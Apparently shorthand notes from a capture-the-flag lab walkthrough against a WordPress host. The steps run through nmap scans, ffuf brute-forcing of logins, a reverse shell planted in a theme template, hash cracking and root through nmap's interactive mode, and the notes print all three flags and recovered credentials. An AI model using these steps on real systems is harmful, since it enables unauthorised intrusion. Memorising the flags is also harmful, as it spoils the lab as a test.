IP: 10.10.19.138
Server: 10.10.123.19

nmap -sV -A -F 10.10.19.138

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache

sudo nmap -sV -A  10.10.19.138 --script vuln -p 80

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder

hint for the key file can be found in /robots.txt

#1
curl http://10.10.19.138/key-1-of-3.txt 
073403c8a58a1f80d943455fb30724b9

/wp-login.php

Brute-forcing login page...

ffuf -w wordlists/usernames.txt -d "user_login=FUZZ&redirect_to=&wp-submit=Get+New+Password" -fr "Invalid username" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.19.138/wp-login.php
elliot                  [Status: 500, Size: 3068, Words: 216, Lines: 111, Duration: 600ms]
ffuf -w fsocity.dic -d "log=elliot&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.19.138%2Fwp-admin%2F&testcookie=1" -fr "ERROR." -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.19.138/wp-login.php 
ER28-0652               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 8485ms]

Exploting Word Press

adding code for reverse shell execution in 404 template
listening on port 4444...
nc -lvnp 4444
visiting http://10.10.19.138/404 to execute the code...
...connected to 10.11.68.10

Post exploitation

terminal stabilization...
python -c 'import pty;pty.spawn("/bin/bash")'

second key in /home/robot
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
crack station... robot:abcdefghijklmnopqrstuvwxyz
su robot
#2
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959

Privilege escalation

https://gtfobins.github.io/
3rd hind: use nmap
nmap --interactive
nmap> !sh
#whoami
root

3rd key in /root directory
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4





